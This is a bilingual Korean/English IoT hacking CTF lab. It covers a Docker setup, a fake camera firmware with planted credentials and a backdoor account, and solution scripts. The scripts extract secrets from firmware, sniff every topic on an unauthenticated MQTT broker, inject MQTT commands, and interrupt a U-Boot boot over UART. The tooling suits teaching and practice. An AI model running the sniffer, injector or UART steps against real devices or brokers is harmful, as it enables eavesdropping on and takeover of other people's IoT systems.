> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# IoT 해킹 CTF 실습 랩

## 실습 환경 준비

### Docker Compose 환경

```yaml
# docker-compose.yml
version: "3.9"

services:
  mqtt-broker:
    image: eclipse-mosquitto:2.0
    container_name: mqtt-broker
    networks:
      iot-net:
        ipv4_address: 172.22.0.10
    ports:
      - "1883:1883"
      - "9001:9001"
    volumes:
      - ./mosquitto.conf:/mosquitto/config/mosquitto.conf

  iot-device-sim:
    image: python:3.11-slim
    container_name: iot-device-sim
    networks:
      iot-net:
        ipv4_address: 172.22.0.20
    command: >
      sh -c "pip install paho-mqtt -q &&
             python3 /app/device_sim.py"
    volumes:
      - ./device_sim.py:/app/device_sim.py

  firmware-server:
    image: python:3.11-slim
    container_name: firmware-server
    networks:
      iot-net:
        ipv4_address: 172.22.0.30
    volumes:
      - ./firmware:/data
    command: python3 -m http.server 8080 --directory /data
    ports:
      - "8080:8080"

  attacker:
    image: python:3.11-slim
    container_name: attacker
    networks:
      iot-net:
        ipv4_address: 172.22.0.100
    command: sleep infinity
    tty: true

networks:
  iot-net:
    driver: bridge
    ipam:
      config:
        - subnet: 172.22.0.0/24
```

### mosquitto.conf

```
listener 1883
allow_anonymous true
listener 9001
protocol websockets
```

### 필수 도구 설치

```bash
pip install paho-mqtt binwalk requests
sudo apt install -y binwalk strings file
```

---

## 실습 1: 펌웨어 추출 및 하드코딩 자격증명 발견

### 목표

IoT 장치 펌웨어 이미지를 분석하여 하드코딩된 자격증명과 숨겨진 플래그를 추출한다.

**플래그 형식**: `CTF{firmware_<credential_type>_exposed}`

### 시나리오

가정용 IP 카메라의 펌웨어 업데이트 파일이 제공됐다. 펌웨어 이미지를 분석하여 제조사가 하드코딩한 관리자 자격증명과 백도어를 찾아라.

### 펌웨어 생성 스크립트

```python
#!/usr/bin/env python3
"""CTF용 가상 IoT 펌웨어 이미지 생성기"""

import gzip
import hashlib
import os
import struct
from pathlib import Path


def create_fake_squashfs(output_dir: str) -> bytes:
    """가상의 SquashFS 파일시스템 내용 생성"""
    # 실제 SquashFS 매직 바이트 (0x73717368)
    squashfs_magic = b"sqsh"

    # 가상 파일시스템 내용
    filesystem_content = b""
    filesystem_content += squashfs_magic
    filesystem_content += b"\x00" * 60  # SquashFS 헤더 패딩

    # 설정 파일 내용 시뮬레이션
    config_content = b"""
[system]
model=IPCam-2000
firmware_version=2.1.4

[network]
default_ip=192.168.1.100
subnet=255.255.255.0

[credentials]
admin_user=admin
admin_pass=admin123!@#
root_pass=t00r_r00t
telnet_enabled=true
telnet_port=23

[backdoor]
debug_user=factory
debug_pass=CTF{firmware_hardcoded_creds_exposed}
debug_port=31337

[mqtt]
broker=192.168.1.1
topic_prefix=ipcam/device001
auth_token=iot_secret_tok3n_2024
"""
    filesystem_content += config_content

    # 웹 인터페이스 파일 시뮬레이션
    web_content = b"""
var API_KEY = "sk-iot-prod-abcd1234efgh5678";
var DEVICE_SECRET = "dev_sec_xyzw9876";
// Default credentials: admin / password
function login(user, pass) {
    if (user == 'admin' && pass == 'admin123!@#') {
        return true;
    }
}
"""
    filesystem_content += web_content
    return filesystem_content


def create_firmware_image(output_path: str) -> None:
    """가상 펌웨어 이미지 생성"""
    # 부트로더 헤더
    header = b"IPCAM"
    header += struct.pack(">I", 0x00020104)  # 버전 2.1.4
    header += b"\x00" * 56  # 패딩

    # SquashFS 파일시스템
    filesystem = create_fake_squashfs(output_path)

    # gzip 압축 시뮬레이션
    compressed_fs = gzip.compress(filesystem)

    # 최종 펌웨어 = 헤더 + 압축된 파일시스템
    firmware = header + compressed_fs

    with open(output_path, "wb") as f:
        f.write(firmware)

    checksum = hashlib.md5(firmware).hexdigest()
    print(f"[+] 펌웨어 생성: {output_path}")
    print(f"[+] 크기: {len(firmware)} bytes")
    print(f"[+] MD5: {checksum}")


if __name__ == "__main__":
    Path("firmware").mkdir(exist_ok=True)
    create_firmware_image("firmware/ipcam_v2.1.4.bin")
```

### 힌트

1. `file firmware.bin` 으로 파일 형식 확인
2. `strings firmware.bin | grep -i "pass\|secret\|admin\|CTF"` 문자열 추출
3. `binwalk -e firmware.bin` 으로 내장 파일시스템 추출
4. gzip 압축 구간 확인: `binwalk -B firmware.bin`

### 풀이

```python
#!/usr/bin/env python3
"""IoT 펌웨어 분석 도구"""

import argparse
import gzip
import re
import struct
from pathlib import Path


def identify_firmware(data: bytes) -> dict[str, str]:
    """펌웨어 형식 식별"""
    info: dict[str, str] = {}

    # 매직 바이트 확인
    magic_map = {
        b"IPCAM": "IP Camera Firmware",
        b"sqsh": "SquashFS Filesystem",
        b"\x1f\x8b": "gzip compressed",
        b"MZ": "PE Executable",
        b"\x7fELF": "ELF Executable",
        b"hsqs": "SquashFS (little-endian)",
    }

    for magic, name in magic_map.items():
        if data.startswith(magic):
            info["format"] = name
            break
        if magic in data[:256]:
            offset = data.index(magic)
            info[f"embedded_{name}"] = f"offset 0x{offset:x}"

    # 버전 정보 추출
    version_match = re.search(rb"(\d+\.\d+\.\d+)", data)
    if version_match:
        info["version"] = version_match.group(1).decode()

    return info


def extract_strings_from_firmware(data: bytes, min_len: int = 8) -> list[str]:
    """펌웨어에서 문자열 추출"""
    pattern = re.compile(rb"[ -~]{" + str(min_len).encode() + rb",}")
    return [m.group().decode("ascii", errors="ignore") for m in pattern.finditer(data)]


def find_credentials(strings: list[str]) -> list[dict]:
    """자격증명 패턴 탐지"""
    cred_patterns = [
        (r"(?i)(password|passwd|pass)\s*[=:]\s*(\S+)", "password"),
        (r"(?i)(user|username|admin)\s*[=:]\s*(\S+)", "username"),
        (r"(?i)(secret|token|key|api_key)\s*[=:]\s*(\S+)", "secret"),
        (r"CTF\{[^}]+\}", "flag"),
    ]

    found: list[dict] = []
    for s in strings:
        for pattern, cred_type in cred_patterns:
            matches = re.findall(pattern, s)
            for match in matches:
                value = match[1] if isinstance(match, tuple) else match
                if len(value) > 3:
                    found.append({"type": cred_type, "value": s.strip(), "match": str(value)})

    return found


def decompress_firmware(data: bytes) -> bytes:
    """gzip 압축 해제 시도"""
    # gzip 시그니처 찾기
    gzip_sig = b"\x1f\x8b"
    offset = data.find(gzip_sig)
    if offset >= 0:
        try:
            return gzip.decompress(data[offset:])
        except gzip.BadGzipFile:
            pass
    return data


def analyze_firmware(firmware_path: str) -> None:
    path = Path(firmware_path)
    if not path.exists():
        print(f"[-] 파일 없음: {firmware_path}")
        return

    with open(path, "rb") as f:
        data = f.read()

    print(f"[*] 펌웨어 분석: {path.name} ({len(data)} bytes)")

    # 형식 식별
    info = identify_firmware(data)
    print("\n=== 펌웨어 정보 ===")
    for k, v in info.items():
        print(f"  {k}: {v}")

    # 압축 해제
    decompressed = decompress_firmware(data)
    if len(decompressed) != len(data):
        print(f"\n[+] 압축 해제 성공: {len(decompressed)} bytes")
        analysis_data = decompressed
    else:
        analysis_data = data

    # 문자열 추출
    strings = extract_strings_from_firmware(analysis_data)
    print(f"\n[*] 추출된 문자열: {len(strings)}개")

    # 자격증명 탐지
    creds = find_credentials(strings)
    if creds:
        print("\n=== 발견된 자격증명/비밀 정보 ===")
        seen = set()
        for c in creds:
            key = c["match"]
            if key not in seen:
                seen.add(key)
                print(f"  [{c['type'].upper()}] {c['value'][:100]}")

    # 플래그 직접 탐색
    flags = re.findall(rb"CTF\{[^}]+\}", analysis_data)
    if flags:
        print("\n[+] 플래그 발견:")
        for flag in set(flags):
            print(f"    {flag.decode()}")


def main() -> None:
    parser = argparse.ArgumentParser(description="IoT 펌웨어 분석 도구")
    parser.add_argument("firmware", help="분석할 펌웨어 파일")
    parser.add_argument("--strings-only", action="store_true", help="문자열만 출력")
    args = parser.parse_args()

    if args.strings_only:
        with open(args.firmware, "rb") as f:
            data = f.read()
        for s in extract_strings_from_firmware(data):
            print(s)
    else:
        analyze_firmware(args.firmware)


if __name__ == "__main__":
    main()
```

---

## 실습 2: MQTT 프로토콜 도청 및 조작

### 목표

IoT 장치가 사용하는 MQTT 브로커에서 메시지를 도청하고, 악의적인 명령을 주입하여 플래그를 획득한다.

**플래그 형식**: `CTF{mqtt_<topic>_intercepted}`

### 시나리오

스마트홈 IoT 장치들이 인증 없이 MQTT 브로커와 통신하고 있다. 브로커에 연결하여 모든 토픽을 구독하고, 민감한 데이터와 플래그를 획득하라.

### MQTT 장치 시뮬레이터

```python
#!/usr/bin/env python3
"""IoT 장치 MQTT 통신 시뮬레이터"""

import json
import time
import paho.mqtt.client as mqtt
from datetime import datetime


def simulate_iot_device(broker_host: str, broker_port: int = 1883) -> None:
    client = mqtt.Client(client_id="ipcam_device_001")
    client.connect(broker_host, broker_port, keepalive=60)
    client.loop_start()

    topics_data = [
        ("ipcam/device001/status", {"status": "online", "ip": "192.168.1.100"}),
        ("ipcam/device001/sensor", {"temperature": 42.5, "humidity": 65}),
        ("ipcam/device001/auth",   {"user": "admin", "token": "secret_cam_tok3n"}),
        ("home/flag",              {"flag": "CTF{mqtt_home_flag_intercepted}", "secret": True}),
        ("ipcam/device001/config", {"rtsp_url": "rtsp://admin:admin123@192.168.1.100/stream"}),
    ]

    for topic, payload in topics_data:
        msg = json.dumps(payload)
        client.publish(topic, msg, qos=1)
        print(f"[DEVICE] Published to {topic}: {msg}")
        time.sleep(1)

    # 주기적 상태 전송
    for i in range(5):
        heartbeat = {"ts": datetime.now().isoformat(), "alive": True, "seq": i}
        client.publish("ipcam/device001/heartbeat", json.dumps(heartbeat))
        time.sleep(2)

    client.loop_stop()
    client.disconnect()


if __name__ == "__main__":
    simulate_iot_device("localhost")
```

### 힌트

1. `mosquitto_sub -h localhost -t "#" -v` 로 모든 토픽 구독
2. 와일드카드 `#`는 모든 하위 토픽, `+`는 단일 레벨 매칭
3. 인증이 없는 MQTT 브로커는 누구나 구독 가능

### 풀이

```python
#!/usr/bin/env python3
"""MQTT 도청 및 분석 도구"""

import argparse
import json
import re
import time
from collections import defaultdict

try:
    import paho.mqtt.client as mqtt
    MQTT_AVAILABLE = True
except ImportError:
    MQTT_AVAILABLE = False
    print("[-] paho-mqtt 미설치: pip install paho-mqtt")


def on_connect(client, userdata, flags, rc: int) -> None:
    status_map = {
        0: "연결 성공",
        1: "프로토콜 버전 오류",
        4: "인증 실패",
        5: "권한 없음",
    }
    print(f"[*] MQTT 연결: {status_map.get(rc, f'코드 {rc}')}")
    if rc == 0:
        client.subscribe("#")  # 모든 토픽 구독
        print("[*] 모든 토픽 구독 시작 (와일드카드 #)")


def on_message(client, userdata, msg) -> None:
    topic = msg.topic
    try:
        payload = json.loads(msg.payload.decode())
    except (json.JSONDecodeError, UnicodeDecodeError):
        payload = msg.payload.decode(errors="ignore")

    print(f"\n[MSG] 토픽: {topic}")
    print(f"      페이로드: {payload}")

    # 민감 정보 탐지
    payload_str = str(payload)
    sensitive_patterns = [
        (r"CTF\{[^}]+\}", "플래그"),
        (r"(?i)(password|passwd|token|secret)['\"]?\s*[:=]\s*['\"]?(\S+)", "자격증명"),
        (r"rtsp://[^\s]+", "RTSP 스트림 URL"),
    ]

    for pattern, label in sensitive_patterns:
        matches = re.findall(pattern, payload_str)
        for match in matches:
            value = match[1] if isinstance(match, tuple) else match
            print(f"  [!] {label} 발견: {value}")

    # 플래그 저장
    flags = re.findall(r"CTF\{[^}]+\}", payload_str)
    if flags:
        userdata["flags"].extend(flags)


def inject_command(
    broker: str,
    port: int,
    topic: str,
    payload: str,
) -> None:
    """MQTT 명령 주입"""
    if not MQTT_AVAILABLE:
        return

    client = mqtt.Client(client_id="attacker_001")
    client.connect(broker, port, keepalive=10)

    result = client.publish(topic, payload, qos=1)
    result.wait_for_publish(timeout=5)
    print(f"[+] 명령 주입: {topic} = {payload}")
    client.disconnect()


def sniff_mqtt(broker: str, port: int, duration: int) -> None:
    if not MQTT_AVAILABLE:
        return

    userdata: dict = {"flags": [], "messages": defaultdict(list)}

    client = mqtt.Client(client_id="sniffer_001", userdata=userdata)
    client.on_connect = on_connect
    client.on_message = on_message

    print(f"[*] MQTT 브로커 연결 중: {broker}:{port}")
    try:
        client.connect(broker, port, keepalive=60)
        client.loop_start()
        time.sleep(duration)
        client.loop_stop()
        client.disconnect()
    except ConnectionRefusedError:
        print(f"[-] 연결 실패: {broker}:{port}")
        return

    print(f"\n=== 캡처 완료 ===")
    if userdata["flags"]:
        print("[+] 수집된 플래그:")
        for flag in set(userdata["flags"]):
            print(f"    {flag}")
    else:
        print("[-] 플래그 미발견 - 구독 토픽 확인 필요")


def main() -> None:
    parser = argparse.ArgumentParser(description="MQTT 도청 도구")
    parser.add_argument("--broker", default="localhost", help="MQTT 브로커 주소")
    parser.add_argument("--port", type=int, default=1883, help="포트 번호")
    parser.add_argument("--duration", type=int, default=30, help="도청 시간(초)")
    parser.add_argument("--inject", nargs=2, metavar=("TOPIC", "PAYLOAD"), help="메시지 주입")
    args = parser.parse_args()

    if args.inject:
        inject_command(args.broker, args.port, args.inject[0], args.inject[1])
    else:
        sniff_mqtt(args.broker, args.port, args.duration)


if __name__ == "__main__":
    main()
```

---

## 실습 3: UART 통신 분석 및 부트 인터럽트

### 목표

IoT 장치의 UART 시리얼 통신을 분석하고, 부트로더 인터럽트를 통해 루트 쉘을 획득한다.

**플래그 형식**: `CTF{uart_bootloader_shell_obtained}`

### 시나리오

라우터 장치의 UART 콘솔에 접근했다. 부트 과정을 인터럽트하여 U-Boot 쉘을 획득하고, 파일시스템에서 플래그를 읽어라.

### UART 통신 시뮬레이터

```python
#!/usr/bin/env python3
"""UART 부트 시퀀스 시뮬레이터"""

import time
import io


BOOT_SEQUENCE = [
    "U-Boot 2021.10 (Oct 01 2021)",
    "CPU:   ARM Cortex-A7",
    "DRAM:  128 MiB",
    "Flash: 16 MiB",
    "",
    "Hit any key to stop autoboot:  3 ",
    "Hit any key to stop autoboot:  2 ",
    "Hit any key to stop autoboot:  1 ",
    "Booting Linux ...",
    "Starting kernel ...",
]

INTERRUPTED_BOOT = [
    "U-Boot 2021.10 (Oct 01 2021)",
    "CPU:   ARM Cortex-A7",
    "DRAM:  128 MiB",
    "",
    "Hit any key to stop autoboot:  3 ",
    "** Autoboot interrupted **",
    "",
    "=> ",  # U-Boot 프롬프트
]

UBOOT_COMMANDS = {
    "help": "Available commands: printenv setenv boot run md mw ...",
    "printenv": (
        "bootcmd=run flash_flash\n"
        "bootargs=console=ttyS0,115200 root=/dev/mtdblock3\n"
        "ipaddr=192.168.1.1\n"
        "flag=CTF{uart_bootloader_shell_obtained}\n"
        "serverip=192.168.1.254\n"
    ),
    "run flash_flash": "Loading kernel from flash...",
}


def simulate_uart_session(interrupt: bool = False) -> None:
    """UART 세션 시뮬레이션"""
    sequence = INTERRUPTED_BOOT if interrupt else BOOT_SEQUENCE

    for line in sequence:
        if "autoboot" in line.lower():
            time.sleep(0.5)
        print(line)

    if interrupt:
        print("[UART] U-Boot 쉘 진입 성공")
        print("[UART] 사용 가능 명령: help, printenv, setenv, boot")

        # printenv 실행
        print("\n=> printenv")
        print(UBOOT_COMMANDS["printenv"])
        print("[+] 플래그 발견: CTF{uart_bootloader_shell_obtained}")


def analyze_uart_output(uart_output: str) -> dict[str, list[str]]:
    """UART 출력 분석"""
    findings: dict[str, list[str]] = {
        "flags": [],
        "credentials": [],
        "ip_addresses": [],
        "env_vars": [],
    }

    import re
    lines = uart_output.splitlines()

    for line in lines:
        # 플래그 탐지
        flags = re.findall(r"CTF\{[^}]+\}", line)
        findings["flags"].extend(flags)

        # IP 주소
        ips = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", line)
        findings["ip_addresses"].extend(ips)

        # 환경 변수
        if "=" in line and not line.startswith("#"):
            findings["env_vars"].append(line.strip())

        # 자격증명 패턴
        if re.search(r"(?i)(password|passwd|user|login)\s*=\s*\S+", line):
            findings["credentials"].append(line.strip())

    return findings


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="UART 시뮬레이터")
    parser.add_argument("--interrupt", action="store_true", help="부트 인터럽트 시뮬레이션")
    args = parser.parse_args()
    simulate_uart_session(args.interrupt)
```

---

<a name="english"></a>

# IoT Hacking CTF Practice Lab

## Lab Environment Setup

Use the Docker Compose configuration above. Key services:
- MQTT broker on port 1883 (unauthenticated)
- Firmware HTTP server on port 8080
- Device simulator publishing sensitive data

```bash
docker-compose up -d
pip install paho-mqtt binwalk
```

---

## Challenge 1: Firmware Extraction and Hardcoded Credentials

### Objective

Analyze an IoT firmware image to find hardcoded credentials and the hidden flag.

**Flag format**: `CTF{firmware_<credential_type>_exposed}`

### Solution Steps

```bash
# Generate firmware
python3 create_firmware.py
# Outputs: firmware/ipcam_v2.1.4.bin

# Static analysis
strings firmware/ipcam_v2.1.4.bin | grep -iE "pass|secret|CTF"

# Automated analysis
python3 firmware_analyzer.py firmware/ipcam_v2.1.4.bin
# Finds: CTF{firmware_hardcoded_creds_exposed}

# Binwalk extraction (if installed)
binwalk -e firmware/ipcam_v2.1.4.bin
grep -r "CTF" _ipcam_v2.1.4.bin.extracted/
```

---

## Challenge 2: MQTT Protocol Interception

### Objective

Intercept MQTT messages from an unauthenticated IoT broker and extract the flag.

**Flag format**: `CTF{mqtt_<topic>_intercepted}`

### Solution Steps

```bash
# Start device simulator
python3 device_sim.py &

# Manual interception
mosquitto_sub -h localhost -t "#" -v

# Automated sniffing
python3 mqtt_sniffer.py --broker localhost --duration 30
# Discovers: CTF{mqtt_home_flag_intercepted}

# Command injection
python3 mqtt_sniffer.py --broker localhost --inject "ipcam/device001/cmd" '{"action":"reboot"}'
```

### Key Topics Found

| Topic | Contents |
|-------|----------|
| `ipcam/device001/auth` | admin credentials + token |
| `home/flag` | `CTF{mqtt_home_flag_intercepted}` |
| `ipcam/device001/config` | RTSP stream URL with credentials |

---

## Challenge 3: UART Bootloader Interrupt

### Objective

Interrupt the U-Boot bootloader via UART to gain shell access and retrieve the flag from environment variables.

**Flag format**: `CTF{uart_bootloader_shell_obtained}`

### Physical Setup (Real Hardware)

```
IoT Device UART Pins → USB-to-Serial Adapter → Host PC
TX → RX, RX → TX, GND → GND
Baud rate: 115200, 8N1
```

```bash
# Connect to UART console
screen /dev/ttyUSB0 115200
# Or: minicom -D /dev/ttyUSB0 -b 115200

# During boot, press any key within 3-second countdown
# At U-Boot prompt:
=> printenv
# Reveals: flag=CTF{uart_bootloader_shell_obtained}
```

### Simulation

```bash
python3 uart_sim.py --interrupt
# Simulates interrupted boot and printenv output
# Flag: CTF{uart_bootloader_shell_obtained}
```
